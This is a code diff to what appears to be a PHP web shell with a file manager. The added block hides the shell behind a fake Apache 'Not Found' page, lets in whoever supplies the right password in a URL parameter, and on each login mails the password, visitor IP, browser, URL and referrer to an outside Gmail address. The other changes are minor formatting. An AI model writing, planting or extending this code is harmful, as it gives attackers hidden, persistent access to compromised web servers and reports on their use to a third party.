@@ -1,8 +1,45 @@
+<?php
+error_reporting(0);
+session_start();
+set_time_limit(0);
+ignore_user_abort(0);
+$password = "49f0bad299687c62334182178bfd75d8";
+function login() {
+?>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<h1>Not Found</h1>
+  <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
+  <hr>
+  <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
+<?php
+  exit();
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
+  if(empty($password) || (isset($_GET['pass']) && (md5($_GET['pass'])) == $password)) {
+    $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
+    $agent = $_SERVER['HTTP_USER_AGENT']; 
+    $uri = $_SERVER['REQUEST_URI']; 
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $ref = $_SERVER['HTTP_REFERER'];
+    $dtime = date('r'); 
+    $log = "
+            Password : ".$password."\n
+            Time : ".$dtime."\n
+            IP : ".$ip."\n
+            Browser : ".$agent."\n
+            Filename : ".$uri."\n
+            URL : ".$ref."\n";
+    @mail('xnonhack@gmail.com', 'Log', $log);
+  } else {
+    @login();
+  }
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
 	<title></title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  	<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <style type="text/css">
 @import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
@@ -1145,7 +1182,7 @@ function get_server_info(){
   			if ($dir === '..') {
   				$back = "<td class='check'>
   							<label class='container'>
-  							<input type='checkbox'name='data[]' onchange='checkAll(this)'>
+  							<input type='checkbox' onchange='checkAll(this)'>
   							<span class='checkmark'></span>
   							</label>
   						</td>
